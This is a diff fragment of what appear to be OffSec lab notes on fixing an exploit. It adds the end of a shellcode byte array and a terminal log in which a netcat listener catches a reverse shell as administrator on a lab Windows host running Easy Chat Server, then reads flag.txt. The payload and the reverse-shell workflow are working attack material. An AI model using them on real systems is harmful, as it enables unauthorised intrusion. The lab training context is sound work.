+shellcode += b"\x9e\x68\x75\x98\x55\xca\x51\x18\xb9\x8d\x12"
+shellcode += b"\x16\x76\xd9\x7c\x3b\x89\x0e\xf7\x47\x02\xb1"
+shellcode += b"\xd7\xc1\x50\x96\xf3\x8a\x03\xb7\xa2\x76\xe5"
+shellcode += b"\xc8\xb4\xd8\x5a\x6d\xbf\xf5\x8f\x1c\xe2\x91"
+shellcode += b"\x7c\x2d\x1c\x62\xeb\x26\x6f\x50\xb4\x9c\xe7"
+shellcode += b"\xd8\x3d\x3b\xf0\x1f\x14\xfb\x6e\xde\x97\xfc"
+shellcode += b"\xa7\x25\xc3\xac\xdf\x8c\x6c\x27\x1f\x30\xb9"
+shellcode += b"\xe8\x4f\x9e\x12\x49\x3f\x5e\xc3\x21\x55\x51"
+shellcode += b"\x3c\x51\x56\xbb\x55\xf8\xad\x2c\x9a\x55\x80"
+shellcode += b"\x43\x72\xa4\xda\x9c\x45\x21\x3c\xc8\x59\x64"
+shellcode += b"\x97\x65\xc3\x2d\x63\x17\x0c\xf8\x0e\x17\x86"
+shellcode += b"\x0f\xef\xd6\x6f\x65\xe3\x8f\x9f\x30\x59\x19"
+shellcode += b"\x9f\xee\xf5\xc5\x32\x75\x05\x83\x2e\x22\x52"
+shellcode += b"\xc4\x81\x3b\x36\xf8\xb8\x95\x24\x01\x5c\xdd"
+shellcode += b"\xec\xde\x9d\xe0\xed\x93\x9a\xc6\xfd\x6d\x22"
+shellcode += b"\x43\xa9\x21\x75\x1d\x07\x84\x2f\xef\xf1\x5e"
+shellcode += b"\x83\xb9\x95\x27\xef\x79\xe3\x27\x3a\x0c\x0b"
+shellcode += b"\x99\x93\x49\x34\x16\x74\x5e\x4d\x4a\xe4\xa1"
+shellcode += b"\x84\xce\x1a\x53\x14\xdb\x8b\xca\xcd\xa6\xd1"
+shellcode += b"\xec\x38\xe4\xef\x6e\xc8\x95\x0b\x6e\xb9\x90"
+shellcode += b"\x50\x28\x52\xe9\xc9\xdd\x54\x5e\xe9\xf7"
+
+
+
+# Once we setup with the correct stageless payload, we got a shell back!!!
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ nc -nvlp 1990                             
+listening on [any] 1990 ...
+connect to [192.168.45.239] from (UNKNOWN) [192.168.219.213] 50138
+Microsoft Windows [Version 10.0.22000.318]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\SysWOW64>whoami
+whoami
+noblesse\administrator
+
+...
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EA01-6936
+
+ Directory of C:\Users\Administrator\Desktop
+
+09/17/2023  09:04 PM    <DIR>          .
+02/16/2023  07:46 AM    <DIR>          ..
+07/26/2022  05:23 PM               796 Easy Chat Server.lnk
+09/17/2023  09:04 PM                78 flag.txt
+07/25/2022  05:04 PM             2,350 Microsoft Edge.lnk
+               3 File(s)          3,224 bytes
+               2 Dir(s)   9,732,108,288 bytes free
+
+C:\Users\Administrator\Desktop>type flag.txt
+type flag.txt
+OS{1620f07ef240af5b7fce29face25a1e5}
+...
+```
